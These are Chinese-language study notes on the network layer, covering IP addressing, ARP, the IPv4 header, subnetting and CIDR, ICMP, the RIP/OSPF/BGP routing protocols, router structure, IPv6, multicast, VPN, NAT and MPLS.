IP地址是一种分等级的地址结构,IP地址的编址方法:分类的IP地址(最基本的编址方法),子网的划分(对最基本的编址方法的改进),无分类编址方法(构成超网). 分类的IP地址:将IP地址划分为若干个固定类,每一类地址都由两个固定长度的字段组成,一个字段是网络号net-id,它标志主机(或路由器)所连接到的网络;另一个字段是主机号host-id,它标志该主机(或路由器).通常IP使用点分十进制表示:192.168.235.131.路由器仅根据目的主机所连接的网络号来转发分组,减小了路由表所占的存储空间. 实际上IP地址是标志一个主机(或路由器)和一条链路的接口,当一个主机同时连接到两个网络上时,该主机就必须同时具有两个相应的IP地址,这种主机称为多归属主机.由于一个路由器至少应当连接到两个网络,因此一个路由器至少应当有两个不同的IP地址.两个路由器直接相连的接口处,可指明也可不指明IP地址.如指明IP地址,则这一段连线就构成了一种只包含一段线路的特殊网络.现在常不指明IP地址. 用转发器或网桥连接起来的若干个局域网仍为一个网络,因此这些局域网都具有同样的网络号net-id. IP地址与硬件地址IP地址与硬件地址是不同的地址,从层次的角度看:硬件地址(或物理地址)是数据链路层和物理层使用的地址,IP地址是网络层和以上各层使用的地址,是一种用软件实现的逻辑地址. 地址解析协议ARPARP作用:由网络层使用的IP地址解析出在数据链路层使用的硬件地址.每一个主机都设有一个ARP高速缓存,里面有所在的局域网上的各主机和路由器的IP地址到硬件地址的映射表. 当主机A欲向本局域网上的某个主机B发送IP数据报时,先在ARP高速缓存中查看有无主机B的IP地址,有就将其对应的硬件地址写入MAC帧,然后通过局域网将该MAC帧发往此硬件地址.没有的话ARP进程会在本局域网上广播发送一个ARP请求分组.收到ARP响应分组后,将得到的IP地址到硬件地址的映射写入ARP高速缓存.从IP地址到硬件地址的解析是ARP进程自动进行的. ARP请求分组:包含发送方硬件地址,发送方IP地址,目标方硬件地址(未知时填0),目标方IP地址. ARP响应分组:包含发送方硬件地址,发送方IP地址,目标方硬件地址,目标方IP地址. ARP分组封装在物理网络的帧中传输.本地广播ARP请求(路由器不转发ARP请求),如果所要找的主机和源主机不在同一个局域网上,那么就要通过ARP找到一个位于本局域网上的某个路由器的硬件地址,然后把分组发送给这个路由器,让这个路由器把分组转发给下一个网络.剩下的工作就由下一个网络来做. IP数据报的格式IP数据报由首部和数据两部分组成.首部的前一部分是固定长度,共20字节,是所有IP数据报必须具有的.后面是一些可选字段,其长度是可变的. 版本占4bit,IPv4版本号为4. 首部长度占4bit,最大数值为15个单位,一个单位表示4byte,因此IP数据包的首部长度最大为60byte. 区分服务占8bit,旧标准叫做服务类型,但一直没被使用,1998年改为区分服务,只有在使用区分服务时该字段才起作用. 总长度占16bit,指首部与数据之和的长度,单位为字节,因此数据包最大长度为65535字节,且总长度不能超过MTU. 标识占16bit,是一个计数器,用来产生IP数据包的标识. 标志占3bit,目前只有前两位有意义.标志字段的最低位是MF,MF=1表示后面还有分片,MF=0表示这是最后一个分片.中间位是DF,DF=0才允许分片. 片偏移占13bit,指该分片在原分组中的相对位置,以8byte为偏移单位. 生存时间占8bit,记为TTL,指示数据报在网络中可通过的路由器数的最大值. 协议占8bit,指出该数据报的数据使用的协议类型,以便目的主机的IP层将数据部分向上传递.IP协议支持多种协议,可以封装多种协议的PDU,例如:ICMP,IGMP,TCP,UDP,OSPF. 首部检验和16bit,只检验数据报的首部,采用的是16bit二进制反码求和算法. 源地址和目的地址各占32bit. 可变部分用于支持排错,测量以及安全等措施,最长40个字节,会被填充对齐到4byte. IP层转发的流程路由器按主机所在的网络地址来制作路由表.根据目的网络地址就能确定下一跳路由器,IP数据报最终一定可以找到目的主机所在目的网络上的路由器(可能要通过多次的间接交付),只有到达最后一个路由器时才试图向目的主机进行直接交付. 虽然互联网所有的分组转发都是基于目的主机所在的网络,但在大多数情况下都允许有这样的特例,即为特定的目的主机指明一个路由.采用特定主机路由可使网络管理人员能更方便地控制网络和测试网络,同时也可在需要考虑某种安全问题时采用这种特定主机路由. 路由器还可采用默认路由以减少路由表所占用的空间和搜索路由表所用的时间,这种转发方式在一个网络只有很少的对外连接时是很有用的.默认路由在主机发送IP数据报时往往更有优势,如果一个主机连接在一个小网络上,而这个网络只用一个路由器和互联网连接,那么在这种情况下使用默认路由是非常合适的. 当路由器收到待转发的数据报,将下一跳路由器的IP地址送交下层的网络接口软件,网络接口软件使用ARP将下一跳路由器的IP地址转换成硬件地址并将此硬件地址放在链路层的MAC帧的首部,然后根据硬件地址找到下一跳路由器. 路由器分组转发算法 从数据报的首部提取目的主机的IP地址D,得出目的网络地址为N. 若网络N与此路由器直接相连,则把数据报直接交付目的主机D;否则下一步. 若路由表中有目的地址为D的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由器;否则下一步. 若路由表中有到达网络N的路由,则把数据报传送给路由表指明的下一跳路由器;否则下一步. 若路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由器;否则报告转发分组出错. 划分子网和构造超网划分子网从1985年起在IP地址中又增加了一个子网号字段,使两级的IP地址变成为三级的IP地址.这种做法叫做划分子网,已成为互联网的正式标准协议.划分子网纯属一个单位内部的事情,单位对外仍然表现为没有划分子网的网络.从主机号借用若干个位作为子网号subnet-id,而主机号host-id也就相应减少了若干个位. 凡是从其他网络发送给本单位某个主机的IP数据报,仍然是根据IP数据报的目的网络号net-id,先找到连接在本单位网络上的路由器,然后此路由器在收到IP数据报后,再按目的网络号和子网号找到目的子网.最后将IP数据报直接交付目的主机. 子网掩码长度为32位,左边部分的一连串1对应网络号和子网号,右边部分的一连串0对应主机号.通过IP地址与子网掩码进行&amp;运算获得网络地址(包括网络号和子网号). 子网掩码是一个网络或一个子网的重要属性,路由器在和相邻路由器交换路由信息时,必须把自己所在网络(或子网)的子网掩码告诉相邻路由器.路由器的路由表中的每一个项目,除了要给出目的网络地址外,还必须同时给出该网络的子网掩码.若一个路由器连接在两个子网上,就拥有两个网络地址和两个子网掩码. 有固定长度子网和变长子网两种子网划分方法.在采用固定长度子网时,所划分的所有子网的子网掩码都是相同的.划分子网增加了灵活性,但却减少了能够连接在网络上的主机总数. 根据已成为互联网标准协议的RFC 950文档,子网号不能为全1或全0,但随着无分类域间路由选择CIDR的广泛使用,现在全1和全0的子网号也可以使用了,但一定要谨慎使用,确认路由器所用的路由选择软件是否支持全0或全1的子网号用法. 使用子网时分组的转发在划分子网的情况下,从IP地址却不能唯一地得出网络地址来,因此分组转发的算法也必须做相应的改动. 从收到的分组的首部提取目的IP地址D. 先用连接的各网络的子网掩码和D逐位相与,看是否和相应的网络地址匹配.若匹配,则将分组直接交付;否则下一步. 若路由表中有目的地址为D的特定主机路由,则将分组传送给指明的下一跳路由器;否则下一步. 对路由表中的每一行,将子网掩码和D逐位相与.若结果与该行的目的网络地址匹配,则将分组传送给该行指明的下一跳路由器;否则下一步. 若路由表中有一个默认路由,则将分组传送给路由表中所指明的默认路由器;否则报告转发分组出错. 无分类编址CIDR(构造超网)使用变长子网掩码VLSM可进一步提高IP地址资源的利用率,在VLSM的基础上又进一步研究出无分类编址方法,正式名字是无分类域间路由选择CIDR. CIDR消除了传统的A类,B类和C类地址以及划分子网的概念,使用各种长度的网络前缀来代替分类地址中的网络号和子网号.CIDR使用斜线记法,在IP地址面加上一个斜线/,然后写上网络前缀所占的位数.例如:220.78.168.0/24.CIDR把网络前缀都相同的连续的IP地址组成CIDR地址块,全1或全0的主机号地址一般不使用. 一个CIDR地址块可以表示很多地址,这种地址的聚合常称为路由聚合,路由聚合也称为构成超网.CIDR虽然不使用子网了,但仍然使用掩码(不叫子网掩码),/20的掩码是20个连续的1,斜线记法中的数字就是掩码中1的个数. 网络前缀的后面加一个星号*的表示方法,如0000101000*,在星号之前是网络前缀,而星号表示IP地址中的主机号,可以是任意值.前缀长度不超过23位的CIDR地址块都包含了多个C类地址,这些C类地址合起来就构成了超网. 使用CIDR时,路由表中的每个项目由网络前缀和下一跳地址组成,在查找路由表时可能会得到不止一个匹配结果.应当从匹配结果中选择具有最长网络前缀的路由,即最长前缀匹配.网络前缀越长,其地址块就越小,因而路由就越具体.最长前缀匹配又称为最长匹配或最佳匹配. IP地址的获取与配置 由系统管理员在文件中硬编码或者通过动态主机配置协议DHCP动态地从服务器得到IP地址. 当路由表的项目数很大时,为了进行更加有效的查找,通常将无分类编址的路由表存放在一种层次的数据结构中,然后自上而下地按层次进行查找.最常用的就是二叉线索.IP地址中从左到右的比特值决定了从根结点逐层向下层延伸的路径,而二叉线索中的各个路径就代表路由表中存放的各个地址.为了提高二叉线索的查找速度,广泛使用了各种压缩技术. 网际控制报文协议ICMPICMP是互联网的标准协议,允许主机或路由器报告差错情况和提供有关异常情况的报告.ICMP不是高层协议,而是网络层的协议.但是ICMP报文是装在IP数据报中,作为其中的数据部分. ICMP报文的种类有两种,即ICMP差错报告报文和ICMP询问报文. ICMP差错报告报文的类型:终点不可达,时间超过,参数问题,改变路由(重定向).对ICMP差错报告报文不再发送ICMP差错报告报文,对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文,对具有多播地址的数据报都不发送ICMP差错报告报文,对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文. ICMP询问报文的类型:回送请求和回答报文,时间戳请求和回答报文.以下几种ICMP报文不再使用:信息请求与回答报文,掩码地址请求和回答报文,路由器询间和通告报文,源点抑制报文. PING工具使用ICMP回送请求与回送回答报文实现,traceroute/tracert用来跟踪一个分组从源点到终点的路径,它利用IP数据报中的TTL字段和ICMP时间超过差错报告报文实现对从源点到终点的路径的跟踪. 互联网的路由选择协议有关路由选择的几个基本概念路由选择是是网络中的所有结点共同协调工作的结果,且路由选择的环境往往是不断变化的,而这种变化有时无法事先知道.从路由算法的自适应性考虑可分为静态路由选择策略(非自适应路由选择)和动态路由选择策略(自适应路由选择). 互联网采用分层次的路由选择协议,通过自治系统AS减小处理粒度.自治系统AS指在单一的技术管理下的一组路由器,这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由,同时还使用一种AS之间的路由选择协议用以确定分组在AS之间的路由.一个AS对其他AS表现出的是一个单一的和一致的路由选择策略. 互联网有两大类路由选择协议:内部网关协议IGP,用于AS内部的路由信息传递(域内路由选择),如RIP和OSPF协议;外部网关协议EGP,用于不同AS之间路由信息的传递(域间路由选择),目前使用最多的是BGP-4. 内部网关协议RIPRIP是一种分布式的,基于距离向量的路由选择协议.RIP协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录. 从一个路由器到直接连接的网络的距离定义为1,从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加1,RIP协议中的距离也称为跳数,这里的距离指的是”最短距离”.RIP认为一个好的路由就是它通过的路由器的数目少,即距离短.RIP允许一条路径最多只能包含15个路由器,距离的最大值为16时即相当于不可达.RIP不能在两个网络之间同时使用多条路由,RIP选择一个具有最少路由器的路由,即最短路由,而不是最快路由. RIP协议的三个特点:仅和相邻路由器交换信息;交换的信息是当前本路由器所知道的全部信息,即自己的路由表;按固定的时间间隔交换路由信息,或者当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息. 路由器在刚刚开始工作时,只知道到直接连接的网络的距离(为1),路由表是空的.以后,每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息,经过若干次更新后,所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址.这个过程称为RIP协议的收敛过程,是较快的. 距离向量算法的基础就是Bellman-Ford算法.要点:X是结点A到B的最短路径上的一个结点,A-&gt;X和X-&gt;B也都分别是结点A到X和结点X到B的最短路径. 路由器收到相邻路由器(其地址为X)的一个RIP报文,先修改此RIP报文中的所有顶目:把下一跳字段中的地址都改为X,并把所有的距离字段的值加1. 对修改后的RIP报文中的每一个顶目重复:若项目中的目的网络不在路由表中,则把该项目加到路由表中;若下一跳字段给出的路由器地址是同样的,则把收到的顶目替换原路由表中的顶目;若收到项目中的距离小于路由表中的距离,则进行更新;否则什么也不做. 若3分钟还没有收到相邻路由器的更新路由表,则把此相邻路由器记为不可达路由器,即将距离置为16. RIP协议让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息(30秒一次),并不断更新其路由表,使得从每一个路由器到每一个目的网络的路由都是最短的. RIP2协议的报文格式.RIP2报文由首部和路由部分组成,路由部分由若干个路由信息组成.每个路由信息需要用20个字节,地址族标识符(又称为地址类别)字段用来标志所使用的地址协议.路由标记填入自治系统的号码,再后面指出某个网络地址,该网络的子网掩码,下一跳路由器地址以及到此网络的距离.一个RIP报文最多可包括25个路由,因而RIP报文的最大长度是504字节. RIP2具有简单的鉴别功能:将原来写入第一个路由信息(20个字节)的位置用作鉴别,这时最多只能再放入24个路由信息. RIP协议特点:好消息传播得快,坏消息传播得慢.当网络出现故障时要经过比较长的时间(例如数分钟)才能将此信息传送到所有的路由器. 内部网关协议OSPF开放最短路径优先OSPF,使用了Dijkstra提出的最短路径算法SPF,采用分布式的链路状态协议. OSPF使用洪泛法向本自治系统中所有路由器发送信息,发送的信息就是与本路由器相邻的所有路由器的链路状态,但这只是路由器所知道的部分信息.链路状态就是说明本路由器都和哪些路由器相邻,以及该链路的度量.只有当链路状态发生变化时,路由器才用洪泛法向所有路由器发送此信息.所有的路由器最终都能建立一个链路状态数据库.这个数据库实际上就是全网的拓扑结构图,它在全网范围内是一致的(这称为链路状态数据库的同步).OSPF的链路状态数据库能较快地进行更新,使各个路由器能及时更新其路由表.OSPF的更新过程收敛得快是其重要优点. 为了使OSPF能够用于规模很大的网络,OSPF将一个自治系统再划分为若干个更小的范围,叫做区域.每一个区域都有一个32位的区域标识符(用点分十进制表示).区域也不能太大,在一个区域内的路由器最好不超过200个.在一个区域内部的路由器只知道本区域的完整网络拓扑,而不知道其他区域的网络拓扑的情况. OSPF使用层次结构的区域划分,在上层的区域叫做主干区域/骨干区域,标识符规定为0.0.0.0.作用是用来连通其他在下层的区域.OSPF不用UDP而是直接用IP数据报传送,所以构成的数据报很短,从而减少路由信息的通信量,也可以不必将长的数据报分片传送,分片传送的数据报只要丢失一个,就无法组装成原来的数据报,整个数据报必须重传. OSPF对不同的链路可根据IP分组的不同服务类型TOS而设置成不同的代价.因此,OSPF对于不同类型的业务可计算出不同的路由.如果到同一个目的网络有多条相同代价的路径,那么可以将通信量分配给这几条路径,这叫做多路径间的负载平衡. 所有在OSPF路由器之间交换的分组都具有鉴别的功能,OSPF支持可变长度的子网划分和无分类编址CIDR.每一个链路状态都带上一个32位的序号,序号越大状态就越新. OSPF有五种分组类型:问候(Hello)分组,数据库描述分组,链路状态请求分组,链路状态更新分组,链路状态确认分组. OSPF规定每隔一段时间,如30分钟,要刷新一次数据库中的链路状态.由于一个路由器的链路状态只涉及到与相邻路由器的连通状态,因而与整个互联网的规模并无直接关系.OSPF没有坏消息传播得慢的问题.多点接入的局域网采用了指定的路由器的方法,使广播的信息量大大减少.指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息. 外部网关协议BGPBGP是不同自治系统的路由器之间交换路由信息的协议,对于自治系统之间的路由选择,要寻找最佳路由是很不现实的.当一条路径通过几个不同AS时,要想对这样的路径计算出有意义的代价是不太可能的.比较合理的做法是在AS之间交换可达性信息.自治系统之间的路由选择必须考虑有关策略,BGP只是寻找一条能够到达目的网络且比较好的路由(不能兜圈子). 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的BGP发言人,一般说来,两个BGP发言人都是通过共享网络连接在一起的.而BGP发言人往往就是BGP边界路由器,但也可以不是.一个BGP发言人与其他自治系统中的BGP发言人要交换路由信息,就要先建立TCP连接,然后在此连接上交换BGP报文以建立BGP会话,利用BGP会话交换路由信息,两者彼此成为对方的邻站或对等站. BGP所交换的网络可达性的信息就是要到达某个网络所要经过的一系列AS,BGP协议交换路由信息的结点数量级是自治系统数的量级,这要比这些自治系统中的网络数少很多.每一个自治系统中BGP发言人的数目是很少的.这样就使得自治系统之间的路由选择不致过分复杂. BGP支持CIDR,因此BGP的路由表也就应当包括目的网络前缀,下一跳路由器,以及到达该目的网络所要经过的各个自治系统序列.在BGP刚刚运行时,BGP的邻站是交换整个的BGP路由表.但以后只需要在发生变化时更新有变化的部分. BGP-4的报文类型. 打开(OPEN)报文,用来与相邻的另一个BGP发言人建立关系. 更新(UPDATE)报文,用来发送某一路由的信息,以及列出要撤消的多条路由. 保活(KEEPALIVE)报文,用来确认打开报文和周期性地证实邻站关系. 通知(NOTIFICATION)报文,用来发送检测到的差错. 路由器的构成路由器是一种典型的网络层设备,是一种具有多个输入端口和多个输出端口的专用计算机,其任务是将某个输入端口收到的分组,按照分组要去的目的地,把该分组从某个合适的输出端口转发给下一跳路由器.所以路由器的主要作用是:连通不同的网络,选择信息传送的线路,转发分组.这正是网络层的主要工作. 整个的路由器结构可划分路由选择部分和分组转发部分.路由选择部分也叫做控制部分,其核心构件是路由选择处理机,其任务是根据所选定的路由选择协议构造出路由表,同时经常或定期地和相邻路由器交换路由信息而不断地更新和维护路由表.分组转发部分由三部分组成:交换结构(根据转发表对分组进行处理),一组输入端口和一组输出端口. 转发就是路由器根据转发表将用户的IP数据报从合适的端口转发出去;路由选择则是按照分布式算法,根据从各相邻路由器得到的关于网络拓扑的变化情况,动态地改变所选择的路由.路由表是根据路由选择算法得出的,而转发表是从路由表得出的. 输入端口里面装有物理层,数据链路层和网络层的处理模块.数据链路层剥去帧首部和尾部后,将分组送到网络层的队列中排队等待处理,这会产生一定的时延.输入端口中的查找和转发功能在路由器的交换功能中是最重要的. 输出端口里有物理层,数据链路层和网络层的处理模块.输出端口从交换结构接收分组,然后把它们发送到路由器外面的线路上.在网络层的处理模块中设有一个缓冲区,当交换结构传送过来的分组的速率超过输出链路的发送速率时,来不及发送的分组就必须暂时存放在这个队列中.数据链路层处理模块将分组加上链路层的首部和尾部,交给物理层后发送到外部线路. 若路由器处理分组的速率赶不上分组进入队列的速率,则队列的存储空间最终必定减少到零,这就使后面再进入队列的分组由于没有存储空间而只能被丢弃.路由器中的输入或输出队列产生溢出是造成分组丢失的重要原因. 交换结构是路由器的关键构件,交换结构把分组从一个输入端口转移到某个合适的输出端口.常用交换方法有三种:通过存储器,通过总线,通过纵横交换结构. 通过存储器:输入端口收到一个分组时就用中断方式通知路由选择处理机,然后分组就从输入端口复制到存储器中,路由器处理机从分组首部提取目的地址,查找路由表,再将分组复制到合适的输出端口的缓存中,若存储器的带宽为每秒M个分组,那么路由器的交换速率(即分组从输入端口传送到输出端口的速率)一定小于M/2. 通过总线:数据报从输入端口通过共享的总线直接传送到合适的输出端口,因为每一个要转发的分组都要通过这一条总线,因此路由器的转发带宽就受总线速率的限制,现代的技术已经可以将总线的带宽提高到每秒吉比特的速率,因此许多的路由器产品都采用这种通过总线的交换方式. 通过纵横交换结构:这种交换结构常称为互连网络,它有2N条总线,可以使N个输入端口和N个输出端口相连接. IPv6IPv6的基本首部IPv6仍支持无连接的传送,但将协议数据单元PDU称为分组,IPv6所引进的主要变化:更大的地址空间(32位到128位),扩展的地址层次结构,灵活的首部格式,改进的选项,允许协议继续扩充,支持即插即用(不需要使用DHCP),支持资源的预分配,首部改为8字节对齐. IPv6数据报由两大部分组成:基本首部和有效载荷/净负荷. IPv6将首部长度变为固定的40字节,首部的字段数只有8个,IPv6对首部中的某些字段进行了如下的更改:取消了首部长度字段;取消了服务类型字段;取消了总长度字段,改用有效载荷长度字段;取消了协议字段,改用下一个首部字段;取消了检验和字段;取消了选项字段,而用扩展首部来实现选项功能;把TTL字段改称为跳数限制字段; 版本占4bit,IPv6为6;通信量类占8bit,用于区分不同IPv6数据报的类别或优先级;流标号占20bit,流是网络从特定源点到特定终点的一系列数据报,所有属于同一个流的数据报都有同样的流标号;有效载荷长度占16bit,它指明IPv6数据报除基本首部以外的字节数,其最大值为64KB;下一个首部占8bit,相当于IPv4的协议字段或可选字段用于指明扩展首部,默认为6,无扩展首部;跳数限制占8bit. IPv6将扩展首部留给路径两端的源站和目的站的主机来处理.数据报途中经过的路由器都不处理这些扩展首部(除了逐跳选项扩展首部).在RFC2460中定义了六种扩展首部:逐跳选项对应0;路由选择对应43;分片对应44;鉴别对应50;封装安全有效载荷对应51;目的站选项对应60;多个扩展首部通过前一个扩展首部的下一个首部指明,规则与上述一致.逐跳选项报头结构有一个扩展报头长度条目指明选项个数. IPv6的地址IPv6数据报的目的地址可以是以下三种基本类型地址之一:单播,多播,任播(目的站是一组计算机,但数据报在交付时只交付其中的一个,通常是距离最近的一个). IPv6将实现IPv6的主机和路由器均称为结点,结点可能有多个与链路相连的接口,IPv6地址是分配给结点上面的接口的,一个接口可以有多个单播地址,任何一个地址都可以当作到达该结点的目的地址. IPv6使用冒号十六进制记法,如:68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF.冒号十六进制记法可以允许零压缩:FF05:0:0:0:0:0:0:B3可压缩为FF05::B3.在任一地址中只能使用一次零压缩.冒号十六进制记法可结合使用点分十进制记法的后缀:0:0:0:0:0:0:128.10.2.1.CIDR的斜线表示法仍然可用:12AB:OOOO:OOOO:CD30:0000:0000:0000:0000/60. 全球单播地址划分方法. 从IPv4向IPv6过渡两种向IPv6过渡的策略:双协议栈;隧道技术.双协议栈是指在完全过渡到IPv6之前,使一部分主机或路由器装有两个协议栈,IPv4和IPv6,同时具有两种IP地址.隧道技术是指在IPv6数据报要进入IPv4网络时,把IPv6数据报封装成为IPv4数据报,整个的IPv6数据报变成了IPv4数据报的数据部分,离开IPv4网络中的隧道时再分离. ICMPv6IPv6不保证数据报的可靠交付,也需要使用ICMP来反馈一些差错信息.新的版本称为ICMPv6.地址解析协议ARP和网际组管理协议IGMP协议的功能都已被合并到ICMPv6中.ICMPv6是面向报文的协议,它利用报文来报告差错,获取信息,探测邻站或管理多播通信.ICMPv6还增加了几个定义报文的功能及含义的其他协议. IP多播IP多播目的是更好地支持一对多通信,即一个源点发送到许多个终点.应用场景:实时信息的交付,软件更新等.采用多播方式,只需发送一次到多播组,由路由器复制分组,局域网具有硬件多播功能,不需要复制分组.在互联网上进行多播就叫做IP多播,IP多播靠路由器来实现,能够运行多播协议的路由器称为多播路由器. IP多播所传送的分组需要使用多播IP地址,在多播数据报的目的地址写入的是多播组的标识符.多播组的标识符就是IP地址中的D类地址(多播地址).每一个D类地址标志一个多播组. 多播数据报和一般的IP数据报的区别就是它使用D类IP地址作为目的地址,并且首部中的协议字段值是2,表明使用网际组管理协议IGMP.多播数据报也是尽最大努力交付,不保证一定能够交付多播组内的所有成员.对多播数据报不产生ICMP差错报文. 互联网号码指派管理局IANA拥有的以太网地址块的高24位为00-00-SE.因此TCP/IP协议使用的以太网地址块的范围是:00-00-5E-00-00-00到00-00-5E-FF-FF-FF.在每一个地址中,只有23位可用作多播.D类IP地址可供分配的有28位,在这28位中的前5位不能用来构成以太网硬件地址.由于多播IP地址与以太网硬件地址的映射关系不是唯一的,因此收到多播数据报的主机,还要在IP层利用软件进行过滤,把不是本主机要接收的数据报丢弃. 多播需要的两种协议:为了使路由器知道多播组成员的信息,需要使用网际组管理协议IGMP.连接在局域网上的多播路由器还必须和互联网上的其他多播路由器协同工作,以便把多播数据报用最小代价传送给所有的组成员,需要使用多播路由选择协议. IGMP和ICMP相似,IGMP使用IP数据报传递其报文,但它也向IP提供服务.不把IGMP看成是一个单独的协议,而是属于整个网际协议IP的一个组成部分. 加入多播组:当某个主机加入新的多播组时,该主机应向多播组的多播地址发送IGMP报文.本地的多播路由器收到IGMP报文后,将组成员关系转发给互联网上的其他多播路由器. 探询组成员变化情况:本地多播路由器要周期性地探询本地局域网上的主机,以便知道这些主机是否还继续是组的成员.只要对某个组有一个主机响应,播路由器就认为这个组是活跃的.一个组在经过几次的探询后仍然没有一个主机响应,则不再将该组的成员关系转发给其他的多播路由器. 在主机和多播路由器之间的所有通信都是使用IP多播,多播路由器在探询组成员关系时,只需要对所有的组发送一个请求信息的询问报文,默认的询问速率是每125秒发送一次.在IGMP的询问报文中有一个数值N,它指明一个最长响应时间,默认值为10秒,当收到询问时,主机在0到N之间随机选择发送响应所需经过的时延.对应最小时延的响应最先发送.同一个组内的每一个主机都要监听响应,只要有本组的其他主机先发送了响应,自己就可以不再发送响应了. 多播路由选择多播路由选择协议尚未标准化.一个多播组中的成员是动态变化的,多播路由选择实际上就是要找出以源主机为根结点的多播转发树,在多播转发树上的路由器不会收到重复的多播数据报,对不同的多播组对应于不同的多播转发树,同一个多播组,对不同的源点也会有不同的多播转发树. 多播路由选择协议在转发多播数据报时使用三种方法. 洪泛与剪除,初始路由器转发多播数据报使用洪泛的方法,采用反向路径广播RPB避免兜圈子. 隧道技术,之前提到过,即对于不支持多播的网络会将多播数据报封装. 基于核心的发现技术,对每一个多播组G指定一个核心路由器,给出它的IP单播地址.核心路由器按照前面讲过的方法创建出对应于多播组G的转发树. RPB的要点. 路由器收到多播数据报时,先检查它是否是从源点经最短路径传送来的.是就向所有其他方向转发刚才收到的多播数据报,否则就丢弃. 如果存在几条同样长度的最短路径,那么只能选择一条最短路径,选择的准则就是看这几条最短路径中的相邻路由器谁的IP地址最小. 最后就得出了用来转发多播数据报的多播转发树,以后就按这个多播转发树转发. 如果在多播转发树上的某个路由器发现它的下游树枝已没有该多播组的成员,就应把它和下游的树枝一起剪除. 当某个树枝有新增加的组成员时,可以再接入到多播转发树上. 几种多播路由选择协议:距离向量多播路由选择协议DVMRP,基于核心的转发树CBT,开放最短通路优先的多播扩展MOSPF,协议无关多播-稀疏方式PIM-SM,协议无关多播-密集方式PIM-DM. 虚拟专用网VPN本地地址指仅在机构内部使用的IP地址,可以由本机构自行分配,而不需要向互联网的管理机构申请.全球地址,全球唯一的IP地址,必须向互联网的管理机构申请.RFC 1918指明了一些专用地址,专用地址只能用作本地地址而不能用作全球地址.在互联网中的所有路由器,对目的地址是专用地址的数据报一律不进行转发. 采用这样的专用IP地址的互连网络称为专用互联网或本地互联网,或专用网.因为这些专用地址仅在本机构内部使用,专用IP地址也叫做可重用地址. 使用隧道技术实现利用公用的互联网作为本机构各专用网之间的通信载体,这样的专用网又称为虚拟专用网VPN,专用网是因为这种网络是为本机构的主机用于机构内部的通信,而不是用于和网络外非本机构的主机通信.VPN没有真正使用通信专线,只是在效果上和真正的专用网一样.如果VPN有保密的要求,那么其所有通过互联网传送的数据都会加密. 一个机构要构建自己的VPN就必须为它的每一个场所购买专门的硬件和软件,并进行配置,使每一个场所的VPN系统都知道其他场所的地址.由部门A和B的内部网络所构成的虚拟专用网VPN又称为内联网(intranet).一个机构和某些外部机构共同建立的虚拟专用网VPN又称为外联网(extranet). 网络地址转换NAT在专用网上使用专用地址的主机如何与互联网上的主机通信(不需要加密).解决方法:再申请一些全球IP地址;采用网络地址转换NAT. 网络地址转换NAT需要在专用网连接到互联网的路由器上安装NAT软件.装有NAT软件的路由器叫做NAT路由器,它至少有一个有效的外部全球IP地址. 所有使用本地地址的主机在和外界通信时,都要在NAT路由器上将其本地地址转换成全球IP地址,才能和互联网连接.内部主机A用本地地址IPA和互联网上主机B通信所发送的数据报必须经过NAT路由器.NAT路由器将数据报的源地址IPA转换成全球地址IPG,并把转换结果记录到NAT地址转换表中,目的地址IPB保持不变,然后发送到互联网.NAT路由器收到主机B发回的数据报时,知道数据报中的源地址是IPB而目的地址是IPG.根据NAT转换表,NAT路由器将目的地址IPG转换为IPA,转发给最终的内部主机A. 当NAT路由器具有n个全球IP地址时,专用网内最多可以同时有n台主机接入到互联网.通过NAT路由器的通信必须由专用网内的主机发起,专用网内部的主机不能充当服务器用,因为互联网上的客户无法请求专用网内的服务器提供服务. 为了更加有效地利用NAT路由器上的全球IP地址,现在常用的NAT转换表把运输层的端口号也利用上.这样就可以使多个拥有本地地址的主机,共用一个NAT路由器上的全球IP地址.使用端口号的NAT叫做网络地址与端口号转换NAPT.而不使用端口号的NAT就叫做传统的NAT.NAPT可用一个LAN侧地址支持60000并行连接。 多协议标记交换MPLSMPLS最初是为提高路由器转发速度而提出,多协议表示在MPLS的上层可以采用多种协议.标记是指每个分组被打上一个标记,根据该标记对分组进行转发. 为了实现交换,可以利用面向连接的概念,使每个分组携带一个叫做标记(label)的小整数.当分组到达交换机(即标记交换路由器)时,交换机读取分组的标记,并用标记值来检索分组转发表.MPLS并没有取代IP,而是作为一种IP增强技术,被广泛地应用在互联网中.通过在专网中采用固定长度标记达到改善IP路由器的转发速率的目的,对端系统透明. MPLS具有以下三个方面的特点:支持面向连接的服务质量;支持流量工程,平衡网络负载;有效地支持虚拟专用网VPN. MPLS的工作原理:在MPLS域的入口处,给每一个IP数据报打上固定长度标记,然后对打上标记的IP数据报用硬件进行转发.采用硬件技术对打上标记的IP数据报进行转发就称为标记交换.交换表示在转发时不再上升到第三层查找转发表,而是根据标记在第二层链路层用硬件进行转发.MPLS域是指该域中有许多彼此相邻的路由器,并且所有的路由器都是支持MPLS技术的标记交换路由器LSR.LSR同时具有标记交换和路由选择这两种功能,标记交换功能是为了快速转发,但在这之前LSR需要使用路由选择功能构造转发表. 基本工作过程. MPLS域中的各LSR使用专门的标记分配协议LDP交换报文,并找出标记交换路径LSP.各LSR根据这些路径构造出分组转发表. 分组进入到MPLS域时,MPLS入口结点把分组打上标记,并按照转发表将分组转发给下一个LSR.给IP数据报打标记的过程叫做分类. 一个标记仅仅在两个标记交换路由器LSR之间才有意义.分组每经过一个LSR,LSR就要:转发,更换新的标记,即把入标记更换成为出标记.这就叫做标记对换. 当分组离开MPLS域时,MPLS出口结点把分组的标记去除.再以后就按照一般分组的转发方法进行转发. 上述的这种由入口LSR确定进入MPLS域以后的转发路径称为显式路由选择. 